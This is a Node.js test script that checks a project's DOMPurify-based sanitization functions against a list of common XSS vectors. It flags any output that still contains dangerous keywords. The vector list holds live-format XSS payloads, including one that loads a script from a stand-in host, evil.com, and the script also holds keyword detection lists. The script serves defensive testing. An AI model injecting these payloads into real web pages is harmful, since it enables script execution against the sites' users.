#!/usr/bin/env node
/**
 * XSS Verification Script
 * 
 * This script tests the sanitization functions with common XSS attack vectors
 * to verify that our DOMPurify implementation is working correctly.
 * 
 * Run with: node scripts/verify-xss-protection.js
 */

// Common XSS attack vectors
const XSS_VECTORS = [
  // Script tags
  '<script>alert("XSS")</script>',
  '<SCRIPT>alert("XSS")</SCRIPT>',
  '<script src="http://evil.com/xss.js"></script>',
  
  // Event handlers
  '<img src=x onerror=alert(1)>',
  '<body onload=alert(1)>',
  '<svg onload=alert(1)>',
  '<input onfocus=alert(1) autofocus>',
  '<select onfocus=alert(1) autofocus>',
  '<textarea onfocus=alert(1) autofocus>',
  
  // JavaScript protocol
  '<a href="javascript:alert(1)">Click</a>',
  '<iframe src="javascript:alert(1)">',
  
  // Data protocol
  '<img src="data:text/html,<script>alert(1)</script>">',
  '<object data="data:text/html,<script>alert(1)</script>">',
  
  // Style-based
  '<div style="background:url(javascript:alert(1))">',
  '<link rel="stylesheet" href="javascript:alert(1)">',
  
  // Encoded attacks
  '<img src=x onerror="&#97;lert(1)">',
  '<img src=x onerror="&#x61;lert(1)">',
  
  // Complex vectors
  '<svg><script>alert(1)</script></svg>',
  '<math><script>alert(1)</script></math>',
  '<form><button formaction="javascript:alert(1)">',
  '<marquee onstart=alert(1)>',
  '<details open ontoggle=alert(1)>',
]

// Test results
const results = {
  passed: 0,
  failed: 0,
  errors: []
}

console.log('🔒 XSS Protection Verification\n')
console.log('Testing sanitization functions against common XSS vectors...\n')

// Dynamically import the sanitize module
async function runTests() {
  try {
    // Use dynamic import to load ES modules in Node.js
    const { sanitizeText, sanitizeHTML } = await import('../src/lib/utils/sanitize.ts')
    
    // Test sanitizeText
    console.log('Testing sanitizeText() - Should strip ALL HTML:\n')
    for (const vector of XSS_VECTORS) {
      const result = sanitizeText(vector)
      
      // Check if result contains dangerous patterns
      const dangerous = [
        'script',
        'onerror',
        'onload',
        'onfocus',
        'javascript:',
        'data:text/html',
        'onclick',
        'onstart',
        'ontoggle'
      ].some(pattern => result.toLowerCase().includes(pattern))
      
      if (dangerous || result.includes('<')) {
        results.failed++
        results.errors.push({
          function: 'sanitizeText',
          input: vector,
          output: result,
          reason: 'Contains dangerous content or HTML'
        })
        console.log(`  ❌ FAILED: ${vector.substring(0, 50)}...`)
      } else {
        results.passed++
        console.log(`  ✅ PASSED: ${vector.substring(0, 50)}...`)
      }
    }
    
    console.log('\n' + '='.repeat(70) + '\n')
    
    // Test sanitizeHTML
    console.log('Testing sanitizeHTML() - Should remove dangerous HTML:\n')
    for (const vector of XSS_VECTORS) {
      const result = sanitizeHTML(vector)
      
      // Check if result contains dangerous patterns
      const dangerous = [
        '<script',
        'onerror=',
        'onload=',
        'onfocus=',
        'javascript:',
        'onclick=',
        'onstart=',
        'ontoggle='
      ].some(pattern => result.toLowerCase().includes(pattern))
      
      if (dangerous) {
        results.failed++
        results.errors.push({
          function: 'sanitizeHTML',
          input: vector,
          output: result,
          reason: 'Contains dangerous JavaScript'
        })
        console.log(`  ❌ FAILED: ${vector.substring(0, 50)}...`)
      } else {
        results.passed++
        console.log(`  ✅ PASSED: ${vector.substring(0, 50)}...`)
      }
    }
    
    // Print summary
    console.log('\n' + '='.repeat(70) + '\n')
    console.log('📊 Test Summary:\n')
    console.log(`  ✅ Passed: ${results.passed}`)
    console.log(`  ❌ Failed: ${results.failed}`)
    console.log(`  📈 Success Rate: ${((results.passed / (results.passed + results.failed)) * 100).toFixed(1)}%\n`)
    
    // Show failures in detail
    if (results.errors.length > 0) {
      console.log('⚠️  Failed Tests:\n')
      results.errors.forEach((error, i) => {
        console.log(`  ${i + 1}. ${error.function}()`)
        console.log(`     Input:  ${error.input}`)
        console.log(`     Output: ${error.output}`)
        console.log(`     Reason: ${error.reason}\n`)
      })
      process.exit(1)
    } else {
      console.log('✨ All XSS vectors successfully blocked!\n')
      console.log('🎉 Your application is protected against common XSS attacks.\n')
      process.exit(0)
    }
    
  } catch (error) {
    console.error('❌ Error running tests:', error)
    console.error('\nNote: This script requires Node.js with ES modules support.')
    console.error('Make sure you have the dependencies installed: npm install\n')
    process.exit(1)
  }
}

runTests()
